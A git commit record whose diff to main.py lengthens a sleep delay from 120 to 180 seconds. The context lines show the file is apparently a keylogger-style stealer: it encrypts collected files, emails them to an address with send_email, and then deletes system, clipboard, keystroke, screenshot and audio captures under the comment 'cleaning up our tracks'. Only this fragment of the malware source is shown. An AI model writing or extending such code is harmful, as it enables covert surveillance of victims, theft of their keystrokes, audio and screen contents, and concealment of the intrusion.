7c9cc9a78a0581cc71830f7b2aaae706b8f208c8
AlejoPHurtado <157452678+AlejoPHurtado@users.noreply.github.com>
2024-03-21 10:11:56 +0000

    Update main.py

--- main.py
+++ main.py
@@ -206,7 +206,7 @@ for encrypting_file_in in files_to_encrpt:
 
     send_email(encrypted_file_names[counts], encrypted_file_names[counts], toaddr)
     count += 1
-time.sleep(120)
+time.sleep(180)
 
 # cleaning up our tracks and delete files
 delete_files = [system_info, clipboard_info, keys_info, screenshot_info, audio_info]
